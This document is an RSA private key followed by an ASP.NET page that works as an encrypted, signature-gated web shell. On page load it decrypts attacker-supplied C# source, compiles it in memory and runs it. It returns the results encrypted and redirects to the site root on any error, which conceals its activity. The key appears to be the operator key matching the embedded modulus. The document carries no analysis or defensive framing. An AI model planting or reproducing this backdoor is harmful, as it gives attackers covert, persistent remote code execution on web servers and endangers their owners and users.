-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDkjkxqLxQ3k9o+
qr6EivlAK9305TKSOidmYxWWDvJSycUp/QV5O2VvnkRvnPEj84cmPUnM8KNvIy+k
8yZ3GDh9KdVkGFi5MT7T70h6uXdXjVPDncG07baS0OpZjmbjT9ml2Cfaw8RKuoGJ
/r8dudxyBEzmI/HyoCrepXeB/FM5+XiMOUbqfyK6EFg162YdEU5bcLj/uohRinQZ
LS9/H6NvSxkiOtILLonWbEzL/VCBLAY5JtyckKHQ2KOfTToNVfatMOgpj3sl9ezm
H4Bzcpbe9CV2TIV0sg6lFtsDjI4wnpcRfo7v+fnW3caQP6sVTCY22lWcw8Z0ijFz
RDId27YNAgMBAAECggEAbDVC0HMBq16A0XKdSLtTTqJ2L1/kFX8a8EqxCZ6B89g7
VKnKUZ9hYvsXg5BWSqMdtWkG69RyTEfoYrwL1g7Nj9SihwVP3D4IdOaw9gmhCv6K
Te7+qt5wtgnbKhNVewFvFinElLpi0M6ETgUiDrzUNdb7YWpbPne+VDMa5ZvE+4jQ
DSJbs1S+cedgvdGDIqZpsHpN6egOgPGEppXqIGjHmtxvJK2+AIqniCkHVEBE/hB5
PleyyoVBz36iOJurzyZ6X4LXiWXZMm15VNRZfaUn8rxsLOqrJnat6hDW/ogRtS6v
kSvTA5EeN6jQuYNMCw2dBV3pvWUhjxto3bFSQ3nhsQKBgQD1MjnFLjp7o1jrZPXv
k84s/ZZNBz3TTDfbDf895larMYvFf4LhwoPajQIT3D+hWF6Z/Y7Pm2sBo8Bmj3eN
ugvIiLia7UH1dhitggaCbBzp3tEN+nuIplADGRDvCJUWVIXSwalHI3ximFADepgf
WvDoW8LNvpeCHA9jnuFMQ9Ag8wKBgQDuoF9WyQlVJ6G4eyJFwdlBdEMNhBI84jU2
ZgOYgQhErYa+dJLjQxV643+tn2IgCqBH+Q2hEXMlTUS2L+W97OW1TdhQTYTHqBYt
yB07AC8uiTnnyLi67Ig5z2ymUT4oUEMaUUHbZAloTvbFzfkU/65O5LzIB8Pr/wCH
uSyb8+KM/wKBgFrD0ObRCg0ilpPst62MBVJaPP0epSBGopaQQ9/iGEse+CKP5R81
JiIM+KvpaBSN5dcTKX5oheABggN1MEhiimIdWljfYv8+TDxOWaKF6t4YAUMvafNX
vV6oNMCHaMjvWOp/je4rkKvevh/LjexteahJ737CAsvDH189PSFCKRVJAoGAMvx7
QnzUDKjaKiPNL+B6fjzMMvAcQXwH6KalcAlp7dqx5rHbzMlBpq9DUaKzgasjkh1J
5zdmRfsbil3zlcAvWKzYYlgd3dcxXfjbHgctDaFuiPLfXbk6ZjfGvEaxpEV6AP6J
tsnKJMpyedNHvE/hO6QuHgNivmMPBvDu8ieLKZsCgYEA8pfLUVb4OtD3nplOumaM
Ym/tB3D8lApVp0wYwvzQo0f1HudQFunubcmCrENFPf95n/QKHJTVtHNvL7eCj2PV
vhse2dTqoBb6X6qlQJJVxxHmbnZuiguRpQtlSXCwmRacs3ciIkFdAzN2PS85fnbn
97UlZ8mAIqLkNVrtB0nNSlY=
-----END PRIVATE KEY-----

<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="Default.aspx.cs" %>
<%@ Import Namespace="System.Reflection"%>
<%@ Import Namespace="Microsoft.CSharp"%>
<%@ Import Namespace="System.CodeDom.Compiler"%>
<%@ Import Namespace="System.IO"%>
<%@ Import Namespace="System.Security.Cryptography"%>
<script language="c#" runat="server">
	public byte[] decrypt(String base64, Guid k)
    {
        byte[] key = k.ToByteArray();
        byte[] ret = Convert.FromBase64String(base64);
        using (MemoryStream memoryStream = new MemoryStream())
        {
            RijndaelManaged r = new RijndaelManaged();
            r.Mode = CipherMode.CBC;
            using (CryptoStream cryptoStream = new CryptoStream(memoryStream, r.CreateDecryptor(key, key), CryptoStreamMode.Write))
            {
                cryptoStream.Write(ret, 0, ret.Length);
                cryptoStream.FlushFinalBlock();
            }
            return memoryStream.ToArray();
        }
    }
    
	public void Page_Load(object sender, EventArgs e)
	{
		try
        {
            String encSource = Request.Params["d"], signature = Request.Params["s"], parameters = Request.Params["p"], ks = Request.Params["ks"];
            String n = "5I5Mai8UN5PaPqq+hIr5QCvd9OUykjonZmMVlg7yUsnFKf0FeTtlb55Eb5zxI/OHJj1JzPCjbyMvpPMmdxg4fSnVZBhYuTE+0+9Ierl3V41Tw53BtO22ktDqWY5m40/Zpdgn2sPESrqBif6/HbnccgRM5iPx8qAq3qV3gfxTOfl4jDlG6n8iuhBYNetmHRFOW3C4/7qIUYp0GS0vfx+jb0sZIjrSCy6J1mxMy/1QgSwGOSbcnJCh0Nijn006DVX2rTDoKY97JfXs5h+Ac3KW3vQldkyFdLIOpRbbA4yOMJ6XEX6O7/n51t3GkD+rFUwmNtpVnMPGdIoxc0QyHdu2DQ==";
            RSACryptoServiceProvider RSA = new RSACryptoServiceProvider();
            
            RSAParameters param = new RSAParameters();
            param.Modulus = Convert.FromBase64String(n);
            param.Exponent = new byte[] { 1, 0, 1 };
            
            RSA.ImportParameters(param);
            string tempPath = Path.GetTempPath() + "\\";
            byte[] ret = null;
            byte[] key = null;
            String enc = "";
            Guid sk;
            String fn = null;

            if(Request.Cookies["sc"] == null || String.IsNullOrEmpty(Request.Cookies["sc"].Value))
            {

                fn = Guid.NewGuid().ToString();
                sk = Guid.NewGuid();
                Response.Cookies["sc"].Value = fn;
                File.WriteAllText(tempPath + fn, sk.ToString());
            }
            else
            {
                fn = Request.Cookies["sc"].Value;
                if(String.IsNullOrEmpty(fn))
                {
                    fn = Guid.NewGuid().ToString();
                    Response.Cookies["sc"].Value = fn;
                }
            }

            if(File.Exists(tempPath + fn))
            {
                sk = new Guid(File.ReadAllText(tempPath + fn));
            }
            else
            {
                fn = Guid.NewGuid().ToString();
                sk = Guid.NewGuid();
                Response.Cookies["sc"].Value = fn;
                File.WriteAllText(tempPath + fn, sk.ToString());
            }

            Guid k = Guid.NewGuid();
            key = k.ToByteArray();
            if (RSA.VerifyData(Encoding.ASCII.GetBytes(encSource), new SHA1CryptoServiceProvider(), Convert.FromBase64String(signature)))
            {
                if (RSA.VerifyData((sk).ToByteArray(), new SHA1CryptoServiceProvider(), Convert.FromBase64String(ks)))
                {
                    byte[] decSource = decrypt(encSource, sk);
                    byte[] decParams = decrypt(parameters, sk);
                    CompilerParameters compilerParams = new CompilerParameters(new string[] { "System.dll", "System.Data.dll", "System.Xml.dll" });
                    compilerParams.GenerateInMemory = true;
                    compilerParams.GenerateExecutable = false;
                    object o = (new CSharpCodeProvider()).CompileAssemblyFromSource(compilerParams, Encoding.ASCII.GetString(decSource)).CompiledAssembly.CreateInstance("A.B");
                    MethodInfo mi = o.GetType().GetMethod("C");
                    ret = (byte[])mi.Invoke(o, Encoding.ASCII.GetString(decParams).Split('|'));
                    using (MemoryStream memoryStream = new MemoryStream())
	                {
	                    RijndaelManaged r = new RijndaelManaged();
	                    r.Mode = CipherMode.CBC;
	                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, r.CreateEncryptor(key, key), CryptoStreamMode.Write))
	                    {
	                        cryptoStream.Write(ret, 0, ret.Length);
	                        cryptoStream.FlushFinalBlock();
	                    }
	                    enc = Convert.ToBase64String(memoryStream.ToArray());
	                }
                }
                else
                {
                    enc = "";
                }
                System.IO.File.WriteAllText(tempPath + fn, k.ToString());
                Response.Write(Convert.ToBase64String(RSA.Encrypt(key, true)) + "\r\n" + enc + "\r\n");
            }
            else
            {

            }
            return;
        }
        catch (Exception ee)
        {
            Response.Redirect("/");
            return;
        }
	}
</script>
